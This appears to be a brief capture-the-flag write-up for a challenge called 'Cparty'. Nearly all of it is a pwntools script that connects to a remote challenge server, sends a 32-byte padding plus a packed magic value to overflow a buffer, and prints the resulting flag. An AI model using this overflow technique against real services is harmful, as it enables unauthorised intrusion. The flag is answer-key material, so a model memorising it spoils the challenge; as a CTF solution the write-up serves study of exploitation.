# Cparty

![](./img/1.png#center)











To start I connect to the server to see what it asks me :



```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *


p = remote("89.38.210.128", 31338)


p.send("A"*32+p32(0xc0defefe))

p.recv(1024)

p.interactive()

#timctf{d0nt_cr4sh_th3_p4rty_b3_th3_p4rty}
```